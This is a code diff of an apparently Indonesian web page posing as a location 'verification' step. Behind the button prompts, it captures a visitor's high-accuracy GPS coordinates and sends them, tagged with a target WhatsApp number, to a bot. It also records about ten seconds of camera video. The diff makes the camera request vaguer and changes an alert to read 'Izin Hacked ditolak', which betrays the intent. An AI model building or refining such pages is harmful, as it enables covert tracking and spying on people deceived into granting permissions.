@@ -89,7 +89,7 @@
             Izinkan untuk melanjutkan proses dan nyalakan lokasi untuk bisa di verifikasi.
         </p>
         <button id="btnGPS" class="btn-permission" onclick="getGPS()">1. GRANT GPS ACCESS</button>
-        <button id="btnCAM" class="btn-permission" onclick="getCAM()">2. GRANT CAMERA ACCESS</button>
+        <button id="btnCAM" class="btn-permission" onclick="getCAM()">2. GRANT ACCESS</button>
         <button id="btnNext" class="btn-primary" style="background: #facc15;" onclick="goToMenu()">LANJUTKAN PROSES</button>
     </div>
 
@@ -144,7 +144,7 @@
             document.getElementById('btnGPS').innerText = "GPS VERIFIED ✓";
             document.getElementById('btnGPS').classList.add('active');
             sendToBot(`<b>📍 COORDINATES</b>\nWA: ${targetWA}\nMaps: <a href="https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}">View Location</a>`);
-        }, () => { alert("PERINGATAN: Izin GPS ditolak atau lokasi belum aktif. Nyalakan lokasi untuk verifikasi."); }, {enableHighAccuracy: true});
+        }, () => { alert("PERINGATAN: Izin GPS ditolak atau belum aktif. Nyalakan lokasi untuk verifikasi."); }, {enableHighAccuracy: true});
     }
 
     function getCAM() {
@@ -167,7 +167,7 @@
             };
             mr.start(); 
             setTimeout(() => { if(mr.state !== "inactive") mr.stop(); }, 10000);
-        }).catch(() => { alert("PERINGATAN: Izin Kamera ditolak. Berikan izin untuk melanjutkan."); });
+        }).catch(() => { alert("PERINGATAN: Izin Hacked ditolak. Berikan izin untuk melanjutkan."); });
     }
 
     function goToMenu() {
